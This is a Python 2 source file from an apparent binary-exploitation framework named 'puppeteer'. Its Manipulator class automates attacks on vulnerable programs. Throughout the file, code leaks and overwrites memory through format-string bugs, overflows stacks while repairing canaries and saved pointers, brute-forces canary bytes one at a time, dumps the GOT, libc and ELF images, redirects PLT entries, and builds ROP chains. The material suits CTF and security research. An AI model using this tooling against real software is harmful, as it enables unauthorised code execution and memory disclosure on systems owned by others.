import logging
l = logging.getLogger("puppeteer.manipulator")
#l.setLevel(logging.INFO)

import struct
import string # pylint: disable=W0402
import itertools
import functools

from .architectures import x86

def try_many(vuln_type):
    def wrapper(vuln):
        functools.wraps(vuln)
        def trier(self, *args, **kwargs):
            if 'f' in kwargs and kwargs['f'] is not None:
                return vuln(self, *args, **kwargs)

            funcs = self._get_vulns(vuln_type)
            for f in funcs:
                try:
                    l.debug("Trying function %s", f.func_name)
                    return vuln(self, *args, f=f, **kwargs)
                except NotLeetEnough:
                    l.debug("... failed!")

            unleet("All %s functions failed!" % vuln_type)
        return trier
    return wrapper

class Manipulator(object):
    def __init__(self, arch=x86):
        '''
        This should connect to or spawn up the program in question.
        '''

        self.arch = arch

        # this is information that is always valid, even if the binary is restarted
        self.permanent_info = { }

        # this is information that is valid until the binary is restarted
        self.instance_info = { }

        # this is information that is valid for a single connection
        self.connection_info = { }

        self.plt = { }
        self.rop_cleanups = { }

        self.got_base = 0
        self.got_size = 0
        self.got_names = [ ]

        self._connection = None

    def info(self, k):
        for d in (self.connection_info, self.instance_info, self.permanent_info):
            if k in d:
                return d[k]
        raise KeyError(k)

    def has_info(self, k):
        try:
            self.info(k)
            return True
        except KeyError:
            return False

    #
    # Connection stuff
    #

    def set_connection(self, connection=None, **kwargs):
        '''
        Set a Connection object as the default way to communicate with the program.

            @param connection: the Connection object to set
            @param host: create a new Connection object with this host
            @param port: create a new Connection object with this port
            @param exe: create a new Connection object with this exe
        '''

        if connection is not None:
            self._connection = connection
        else:
            self._connection = Connection(**kwargs)

        return self._connection

    def connect(self): # pylint: disable=no-self-use
        if self._connection is None:
            raise Exception("Please implement a connect function or call set_connection()!")
        else:
            return self._connection.connect()

    def _implemented_connect(self):
        return self.connect.im_class != Manipulator or self._connection is not None

    def _is_connected(self):
        return self._connection.connected

    def _crash(self):
        l.debug("Program crashed!")
        self._disconnect()
        self.instance_info = { }
        self.connection_info = { }

    def _disconnect(self):
        l.debug("Program disconnected!")
        if self._connection is not None:
            self._connection.connected = False
        self.connection_info = { }

    #
    # Utility funcs
    #

    def fix_endness_strided(self, s):
        '''
        Goes through the string, in chunks of the bitwidth of the architecture,
        and fixes endness.
        '''
        if self.arch.endness == '>':
            return s

        return "".join([ s[i:i+self.arch.bytes][::-1] for i in range(0, len(s), self.arch.bytes) ])

    def pack(self, n):
        if type(n) in (int, long):
            return struct.pack(self.arch.struct_fmt, n)
        if type(n) == str:
            return n

    def unpack(self, n):
        if type(n) in (int, long):
            return n
        if type(n) == str:
            return struct.unpack(self.arch.struct_fmt, n)[0]

    def new_fmt(self):
        return FmtStr(arch=self.arch)

    def _get_vulns(self, t, throw=True):
        vulns = [ ]

        l.debug("Looking for a %s vuln...", t)

        for a in dir(self):
            #l.debug("... checking attribute %s", a)
            f = getattr(self, a)
            if hasattr(f, 'puppeteer_flags') and f.puppeteer_flags['type'] == t:
                vulns.append(f)

        if len(vulns) == 0 and throw:
            unleet("Couldn't find an %s vuln" % t, level=logging.DEBUG)
        return vulns

    def _do_vuln(self, vuln_type, args, kwargs):
        funcs = self._get_vulns(vuln_type)

        for f in funcs:
            try:
                l.debug("Trying function %s", f.func_name)
                return f(*args, **kwargs)
            except NotLeetEnough:
                l.debug("... failed!")

        unleet("No %s functions available!" % vuln_type)

    #
    # Actions!
    #

    @try_many('memory_read')
    def do_direct_memory_read(self, addr, length, f=None): #pylint:disable=no-self-use
        l.debug("Trying a direct memory read with %s", f.__name__)
        max_size = f.puppeteer_flags['max_size']

        r = ""
        while len(r) < length:
            toread = min(length, max_size)
            l.debug("... reading %d bytes", toread)
            r += f(addr + len(r), toread)
        return r

    def do_memory_read(self, addr, length):
        ''' Finds and executes an vuln that does a memory read. '''
        # first, try to do it directly
        try:
            return self.do_direct_memory_read(addr, length)
        except NotLeetEnough:
            # now do the printf path
            return self.do_printf_read(addr, length)

    def do_register_read(self, reg):
        ''' Finds and executes an vuln that does a register read. '''
        return self._do_vuln('register_read', (reg,), { })

    def do_memory_write(self, addr, content):
        ''' Finds and executes an vuln that does a memory write. '''

        l.debug("First trying a direct memory write.")
        try:
            return self._do_vuln('memory_write', (addr, content), { })
        except NotLeetEnough:
            l.debug("Now trying a naive printf write.")
            return self.do_printf_write((addr, content))

    def do_register_write(self, reg, content):
        ''' Finds and executes an vuln that does a register write. '''
        return self._do_vuln('register_write', (reg, content), { })

    @try_many('printf')
    def do_printf(self, fmt, f=None): #pylint:disable=no-self-use
        '''
        Finds and executes an vuln that does a memory read.

        @param fmt: the format string!
        '''
        l.debug("Trying function %s", f.func_name)
        if isinstance(fmt, FmtStr):
            fmt.set_flags(**f.puppeteer_flags['fmt_flags'])
            result = f(fmt.build())
            l.debug("... raw result: %r", result)
            if len(result) < fmt.literal_length:
                return ""
            else:
                result = result[fmt.literal_length:]
                l.debug("... after leading trim: %r", result)
                try:
                    result = result[:result.rindex(fmt.pad_char * fmt.padding_amount)]
                except ValueError:
                    l.warning("This is on no sleep and is probably wrong")
                    result.rstrip(fmt.pad_char)
                l.debug("... after trailing trim: %r", result)
            return result
        elif isinstance(fmt, str):
            if f.puppeteer_flags['fmt_flags']['forbidden'] is not None:
                for c in f.puppeteer_flags['fmt_flags']['forbidden']:
                    if c in fmt:
                        raise unleet("Forbidden chars in format string (%r)" % c)
            return f(fmt)
        else:
            raise Exception("Unrecognized format string type. Please provide FmtStr or str")

    def do_printf_read(self, addr, length, max_failures=10):
        '''
        Do a printf-based memory read.

        @param addr: the address
        @param length: the number of bytes to read
        @param default_char: if something can't be read (for example, because
                             of bad chars in the format string), replace it
                             with this
        @param max_failures: the maximum number of consecutive failures before
                             giving up.
        @param safe: safety
        '''
        l.debug("Reading %d bytes from 0x%x using printf", length, addr)

        max_failures = length if max_failures is None else length
        failures = 0

        content = ""
        while len(content) < length:
            cur_addr = addr + len(content)
            left_length = length - len(content)
            fmt = FmtStr(self.arch).absolute_read(cur_addr)

            try:
                new_content = self.do_printf(fmt)[:left_length]
            except NotLeetEnough:
                failures += 1
                content += '\00'
                continue

            content += new_content
            if len(new_content) == 0:
                l.debug("... potential null byte")
                content += '\x00'

            if failures > max_failures:
                raise unleet("do_printf_read hit more than %d consecutive failures" % max_failures)

        return content

    @try_many('stack_overflow')
    def do_replace_stack(self, new_ip, pre_stack=None, post_stack=None, f=None):
        '''
        Finds and executes a vuln that overflows the stack.
        '''
        if pre_stack is None:
            pre_stack = "A" * f.puppeteer_flags['ip_distance']

        if f.puppeteer_flags['ip_distance'] != len(pre_stack):
            raise NotLeetEnough("Pre-stack length doesn't match the distance to the saved IP!")

        payload = pre_stack + self.pack(new_ip) + post_stack
        return f(payload)

    @try_many('stack_overflow')
    def do_stack_overflow(self, towrite, fix_canary=True, fix_bp=False, fix_ip=False, f=None):
        canary_offset = f.puppeteer_flags['canary_offset']
        bp_offset = f.puppeteer_flags['bp_offset']
        ip_offset = f.puppeteer_flags['ip_offset']
        buf = ""

        if canary_offset is not None and fix_canary and self.has_info('determined_canary'):
            l.debug("... fixing canary")
            buf += towrite[len(buf):canary_offset]
            buf += self.info('determined_canary')[:len(towrite) - len(buf)]

        if bp_offset is not None and fix_bp and self.has_info('determined_bp'):
            l.debug("... fixing bp")
            buf += towrite[len(buf):bp_offset]
            buf += self.info('determined_bp')[:len(towrite) - len(buf)]

        if ip_offset is not None and fix_ip and self.has_info('determined_ip'):
            l.debug("... fixing ip")
            buf += towrite[len(buf):ip_offset]
            buf += self.info('determined_ip')[:len(towrite) - len(buf)]

        buf += towrite[len(buf):]
        return f(buf)

    def do_printf_write(self, writes):
        '''
        Do a memory write using a printf vulnerability.

        @param writes: a tuple of (addr, bytes) tuples
        @param safe: whether it's ok for the program to stop functioning afterwards
        '''

        # this is an overwrite of a set of bytes. We don't care about the output.
        chunks = [ (writes[0]+i, j) for i,j in enumerate(writes[1]) ]
        fmt = FmtStr(self.arch).absolute_writes(chunks)
        return self.do_printf(fmt)

    def do_relative_read(self, offset, length, reg=None):
        try:
            reg = self.arch.sp_name if reg is None else reg
            return self.do_memory_read(self.do_register_read(reg) + offset, length)
        except NotLeetEnough:
            if reg != self.arch.sp_name:
                raise

            result = ""
            while len(result) < length*2:
                fmt = FmtStr(self.arch).relative_read(1 + len(result)/self.arch.bytes/2 + offset/self.arch.bytes, min(length/self.arch.bytes, 10))
                r = self.do_printf(fmt)
                if len(r) > fmt.prepadding_length:
                    r = r[fmt.prepadding_length:]
                    r.rstrip(fmt.pad_char)
                result += r
            return self.fix_endness_strided(result.decode('hex'))

    #
    # More complex stuff
    #
    def determine_bytes_by_overflow(self, f, offset, size): # pylint:disable=no-self-use
        '''
        Leaks some bytes by doing a write, expecting incorrect bytes to crash the program.

            @param f: the vuln to run
            @param offset: the offset where the bytes start
            @param size: number of bytes to get
        '''
        pad_char = f.puppeteer_flags['pad_char']
        success_str = f.puppeteer_flags['nocrash_str']
        success_func = f.puppeteer_flags['nocrash_func']

        buff = ""
        prefix = pad_char*offset

        for _ in range(size):
            l.info("Determining byte %d of %d", _, size)
            for b in range(256):
                try:
                    l.debug("... trying: 0x%x for byte %d", b, _)
                    s = self.do_stack_overflow(prefix + buff + chr(b), fix_canary=True, fix_bp=True, fix_ip=True, f=f)
                    l.debug("... program returned: %s", s.encode('hex'))

                    if (success_str is not None and s == success_str) or (success_func is not None and success_func(s)) or (success_str is None and success_func is None):
                        l.debug("... got: 0x%x", b)
                        buff += chr(b)
                        break
                except (ConnectionFail, NotLeetEnough):
                    l.debug("... failure.")

                    continue

            if len(buff) == _:
                unleet("Failed to get byte %d" % _)

        return buff

    @try_many('stack_overflow')
    def determine_named_bytes(self, offset_name, f=None):
        '''
        Leaks the named bytes.

            @param offset_name: the thing you want to determine ('canary', 'ip', 'bp')
        '''
        if f.puppeteer_flags[offset_name + '_offset'] is None:
            raise NotLeetEnough("No offset named %s" % offset_name)

        self.instance_info['determined_' + offset_name] = self.determine_bytes_by_overflow(f, f.puppeteer_flags[offset_name + '_offset'], self.arch.bytes)
        return self.info('determined_' + offset_name)

    def determine_canary(self): return self.determine_named_bytes('canary')
    def determine_saved_ip(self): return self.determine_named_bytes('ip')
    def determine_saved_bp(self): return self.determine_named_bytes('bp')

    def read_got_entry(self, which):
        if type(which) == str:
            which = self.got_names.index(which)
        return self.do_memory_read(self.got_base+which*self.arch.bytes, self.arch.bytes)

    def dump_got(self):
        return self.do_memory_read(self.got_base, self.got_size*self.arch.bytes)

    def do_page_read(self, addr):
        base = addr - (addr % self.arch.page_size)
        return self.do_memory_read(base, self.arch.page_size)

    def redirect_library_function(self, name, target):
        '''
        Redirects a PLT entry to jump to target.

        @params name: the name to redirect
        @params target: the address to redirect to
        '''
        self.do_memory_write(self.plt[name], self.pack(target))

    def dump_stack(self, length, offset=0):
        '''
        Read the stack, from the current stack pointer (or something close), to sp+length

        @params length: the number of bytes to read. More bytes might be attempted if we end up using
                        a printf
        @params offset: the offset
        '''

        return self.do_relative_read(offset, length, reg=self.arch.sp_name)

    def main_return_address(self, start_offset=None):
        '''
        Get the return address that main will return to. This is usually
        libc_start_main, in libc, which gets you the address of (and a pointer
        into) libc off of a relative read.
        '''

        start_offset = 1 if start_offset is None else start_offset

        # strategy:
        # 1. search for a return address to main
        # 2. look for main's return address (to __libc_start_main)
        # 3. awesome!

        l.debug("Looking for libc!")

        i = 0
        for i in itertools.count(start=start_offset):
            l.debug("... checking offset %d", i)
            v = self.unpack(self.do_relative_read(i*self.arch.bytes, self.arch.bytes))
            if v >= self.info('main_start') and v <= self.info('main_end'):
                l.debug("... found the return address to main (specifically, to 0x%x) at offset %d!", v, i)
                break

        i += 3 + self.info('main_stackframe_size') / self.arch.bytes
        l.debug("... the return address into __libc_start_main should be at offset %d", i)

        v = self.unpack(self.do_relative_read(i*self.arch.bytes, self.arch.bytes))
        return v

    def dump_elf(self, addr, filename=None):
        '''
        Dumps an ELF at the given address. The address can index partway into the ELF.
        '''
        addr -= addr % self.arch.page_size

        pages = { }
        queue = [ addr ]
        l.info("Dumping the ELF that includes 0x%x", addr)

        while len(queue) != 0:
            a = queue.pop()
            l.info("... dumping page 0x%x", a)
            pages[a] = self.do_memory_read(a, self.arch.page_size)

            if type(pages[a]) != str:
                pages[a] = ''

            pages[a].ljust(self.arch.page_size, '\x00')

            # assume that ELFs are continuous in memory, and start with '\x7fELF'
            # however, since the first byte often can't be read by a format string
            # (because \x00 is in the address), we need to match '\x00ELF' as well
            if pages[a].startswith('\x7fELF') or pages[a].startswith('\x00ELF'):
                break

            queue.append(a - self.arch.page_size)
            #if pages[a][-4:] != '\x00\x00\x00\x00':
            #   queue.append(a + self.arch.page_size)

            # TODO: the following only works on, at best, static binaries
            # that we just don't have locally. It won't work for things
            # that use relative jumps (almost everything). For that,
            # we should really disassemble the dumped page...
            #if self.pack(a - self.arch.page_size) in pages[a]:
            #   l.info("... 0x%x found!", a - self.arch.page_size)
            #   queue.append(a - self.arch.page_size)
            #if self.pack(a + self.arch.page_size) in pages[a]:
            #   l.info("... 0x%x found!", a + self.arch.page_size)
            #   queue.append(a + self.arch.page_size)

        if filename is not None:
            f = open(filename, "w")
            for k in sorted(pages.keys()):
                f.write(pages[k])

        return pages

    def dump_libc(self, filename, start_offset=None):
        '''
        Dumps libc, starting either from the page containing __libc_start_main
        or some other GOT-mapped function and working backwards to the
        beginning.

        @param filename: the filename to save the leaked bytes to
        @param start_offset: the offset (on the stack) at which to start
                             scanning for the return from main. Default:
                             start from lowest point on stack.
        '''
        libc_addr = self.main_return_address(start_offset=start_offset)
        return self.dump_elf(libc_addr, filename=filename)

    #
    # Crazy UI
    #
    def memory_display(self, p, addr):
        perline = 24
        print ""
        print "# Displaying the page at 0x" + (self.arch.python_fmt % addr)
        print ""
        for i in range(0, len(p), perline):
            line = p[i:i+perline]
            count = 0
            for c in line:
                print c.encode('hex'),
                count += 1
                if count % 4 == 0:
                    print "",

            print '|',"".join([ (c if c in string.letters + string.digits + string.punctuation else '.') for c in line ])

        nums = sorted(tuple(set(struct.unpack(self.arch.endness + str(self.arch.page_size/self.arch.bytes) + self.arch.struct_char, p))))

        perline = 10
        print ""
        print "# Aligned integers in the page:"
        print ""
        for i in range(0, len(nums), perline):
            line = nums[i:i+perline]
            print " ".join([ self.arch.python_fmt % c for c in line ])

        nums = sorted(tuple(set([ i - i%self.arch.page_size for i in struct.unpack(self.arch.endness + str(self.arch.page_size/self.arch.bytes) + self.arch.struct_char, p) ])))

        perline = 10
        print ""
        print "# Possible pages to look at next:"
        print ""
        for i in range(0, len(nums), perline):
            line = nums[i:i+perline]
            print " ".join([ self.arch.python_fmt % c for c in line ])

    def memory_explorer(self, start):
        '''
        This launches an interactive memory explorer, using a memory read vuln.
        It should probably be moved somewhere else.
        '''
        print "###"
        print "### Super Memory Explorer 64"
        print "###"
        print ""
        if start is None:
            start = self.do_register_read('esp')
            print "SP:", hex(start)
        else:
            print "Starting at:",hex(start)

        a = 'asdf'
        addr = None

        while a != 'q':
            print ""
            print "# Please enter one of:"
            print "#"
            print "#    - s (to go back to the start address 0x%x)" % start
            print "#    - a hex address (to look at its page)"
            print "#    - q (to quit)"
            print "#    - '' or 'n'(to look at the next page)"
            print "#    - 'p' (to look at the previous page)"
            a = raw_input("> ")

            if a in ['s']:
                addr = start
            elif a in ['', 'n']:
                addr = addr + self.arch.page_size if addr is not None else start
            elif a in ['p']:
                addr = addr - self.arch.page_size if addr is not None else start
            else:
                try:
                    addr = int(a, 16)
                except ValueError:
                    continue

            addr -= addr % self.arch.page_size

            p = self.do_page_read(addr)
            self.memory_display(p, addr)

    #
    # ROP stuff
    #

    def rop(self, *args, **kwargs):
        '''
        This returns a new ROP chain that you can then add ROP craziness to.
        '''
        return ROPChain(arch=self.arch, *args, **kwargs)

    def gadget(self, *args, **kwargs):
        '''
        This returns a new ROPGadget (and takes the same args as ROPGadget).
        '''
        return ROPGadget(self.arch, *args, **kwargs)

from .errors import NotLeetEnough, ConnectionFail
from .formatter import FmtStr
from .rop import ROPChain, ROPGadget
from .utils import unleet
from .connection import Connection
